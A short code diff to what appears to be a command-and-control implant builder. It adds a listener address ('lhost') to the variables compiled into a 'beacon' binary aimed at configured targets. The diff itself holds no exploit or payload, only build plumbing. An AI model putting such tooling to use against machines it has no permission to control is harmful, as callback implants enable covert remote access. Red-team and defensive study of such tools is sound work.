@@ -183,6 +183,7 @@ int compile(ARGS args){
     int id_int = std::stoi(id);
     int port;
     std::string ip_addr;
+    std::string serv_ip_addr;
     try {
     port = config["targets"][id_int]["beacon"]["port"];
     } catch (...) {
@@ -190,17 +191,20 @@ int compile(ARGS args){
         return 1;
     }
     ip_addr = config["targets"][id_int]["ip"];
+    serv_ip_addr = config["lhost"];
 
     std::string port_str = std::to_string(port);
 
     std::string id_st = "int beacon_id = " + id + ';';
     std::string port_st = "int beacon_port = " + port_str + ';';
     std::string ip_addr_st = "const char *beacon_ip_addr = \"" + ip_addr + "\";";
+    std::string serv_ip_addr_st = "const char *serv_ip_addr = \"" + serv_ip_addr + "\";";
     std::ofstream varfile("remote/beacon.vars");
 
     varfile << id_st << std::endl;
     varfile << port_st << std::endl;
     varfile << ip_addr_st << std::endl;
+    varfile << serv_ip_addr_st << std::endl;
 
     system("echo \"binary to be saved to $PWD/beacon\"");
     std::string compiler = args[1];
